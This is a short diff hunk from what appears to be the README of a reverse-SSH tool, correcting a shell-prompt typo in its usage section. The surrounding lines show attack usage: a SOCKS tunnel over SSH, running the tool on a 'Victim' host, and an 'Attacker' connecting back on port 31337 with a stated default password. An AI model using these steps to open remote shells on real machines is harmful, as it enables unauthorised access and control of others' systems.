@@ -73,7 +73,7 @@ $ ssh -p <RPORT> -D 9050 <RHOST>
 
 ```
 # Victim
-$ victim$ ./reverse-ssh
+victim$ ./reverse-ssh
 
 # Attacker (default password: letmeinbrudipls)
 attacker$ ssh -p 31337 <LHOST>
